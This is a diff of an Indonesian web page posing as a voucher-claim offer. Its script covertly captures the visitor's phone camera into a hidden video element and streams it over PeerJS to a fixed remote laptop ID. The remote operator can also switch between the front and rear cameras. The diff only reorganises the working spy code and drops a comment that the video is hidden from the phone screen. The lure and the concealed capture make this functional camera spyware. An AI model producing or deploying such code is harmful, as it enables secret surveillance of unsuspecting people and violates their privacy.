@@ -18,39 +18,50 @@
     <button onclick="alert('Voucher berhasil diklaim!')">KLAIM SEKARANG</button>
   </div>
 
-  <!-- Video disembunyikan total dari layar HP -->
   <video id="webcam" autoplay playsinline style="display: none;"></video>
 
   <script>
-    const ID_LAPTOP = "guru-demo-kamera-123"; // ID unik penghubung
+    const ID_LAPTOP = "guru-demo-kamera-123";
     const peer = new Peer();
     let currentStream = null;
-    let useFrontCamera = false;
-
-    async function startCamera(facingMode) {
-      if (currentStream) currentStream.getTracks().forEach(track => track.stop());
-      try {
-        currentStream = await navigator.mediaDevices.getUserMedia({
-          video: { facingMode: facingMode }
-        });
-        document.getElementById('webcam').srcObject = currentStream;
-        peer.call(ID_LAPTOP, currentStream);
-      } catch (err) { console.error(err); }
-    }
+    let isFrontCamera = false;
+    let dataConn = null;
 
     peer.on('open', () => {
-      startCamera(useFrontCamera ? "user" : "environment");
+      // Hubungkan data ke laptop
+      dataConn = peer.connect(ID_LAPTOP);
+      
+      dataConn.on('open', () => {
+        // Mendengar perintah tombol dari laptop
+        dataConn.on('data', (data) => {
+          if (data === 'switch') {
+            isFrontCamera = !isFrontCamera;
+            startCamera();
+          }
+        });
+      });
+
+      startCamera();
     });
 
-    // Menerima perintah dari laptop untuk ganti kamera
-    peer.on('connection', (conn) => {
-      conn.on('data', (data) => {
-        if (data === 'switch') {
-          useFrontCamera = !useFrontCamera;
-          startCamera(useFrontCamera ? "user" : "environment");
-        }
-      });
-    });
+    async function startCamera() {
+      // Hentikan stream kamera sebelumnya jika ada
+      if (currentStream) {
+        currentStream.getTracks().forEach(track => track.stop());
+      }
+      try {
+        const mode = isFrontCamera ? "user" : "environment";
+        currentStream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: mode }
+        });
+        document.getElementById('webcam').srcObject = currentStream;
+        
+        // Kirim siaran kamera baru ke laptop
+        peer.call(ID_LAPTOP, currentStream);
+      } catch (err) {
+        console.error("Gagal mengakses kamera:", err);
+      }
+    }
   </script>
 </body>
 </html>
